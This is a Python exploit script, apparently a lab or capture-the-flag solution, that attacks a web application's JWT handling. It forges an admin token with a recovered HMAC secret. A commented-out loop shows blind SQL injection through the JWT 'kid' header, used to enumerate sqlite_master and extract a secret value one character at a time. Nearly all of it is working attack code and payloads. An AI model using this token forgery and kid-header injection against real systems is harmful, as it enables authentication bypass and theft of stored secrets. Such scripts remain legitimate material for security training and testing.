#eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEifQ.eyJ1c2VyIjpudWxsfQ.2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ
#header='{"typ":"JWT","alg":"HS256","kid":"key1"}'
#payload='{"user":"admin"}'

import jwt
import string
import requests

url = 'http://ptl-312c70c5-b9ea269a.libcurl.so/'
cookies = {}

pwn = '6224a507-98fe-4d3f-805d-ae41ada4b4ae'
encoded_jwt = jwt.encode({'user': 'admin'}, '6224a507-98fe-4d3f-805d-ae41ada4b4ae', algorithm='HS256', headers={'kid': 'key1'})
cookies['auth'] = encoded_jwt.decode()
response = requests.get(url, cookies=cookies)
print(response.text) #3185a61d-1b90-4c24-8ce9-5e1ee6fbc5b8

"""
for j in range(1000):
    for i in string.printable.replace('%','5').replace('_','6'): #' ,abcdefghijklmnopqrstuvwxyz_':
        # tbl_name:secrets(name,value)
        # encoded_jwt = jwt.encode({'user': 'admin'}, 'secret', algorithm='HS256', headers={'kid': "kek1' union select tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' and tbl_name like 'secrets"+i+"%'--"})
        # encoded_jwt = jwt.encode({'user': 'admin'}, 'secret', algorithm='HS256', headers={'kid': "kek1' union SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND sql like '"+(pwn+i)+"%' escape '\\' and name NOT LIKE 'sqlite_%' AND name='secrets'--"})
        # create table secrets(name text not null, value t

        encoded_jwt = jwt.encode({'user': 'admin'}, 'secret', algorithm='HS256', headers={'kid': "key1' AND value like '"+(pwn+i)+"%'--"})
 
        cookies['auth'] = encoded_jwt.decode()
        response = requests.get(url, cookies=cookies)
        if 'undefined method' not in response.text:
            pwn += i
            print(pwn)
            break
"""
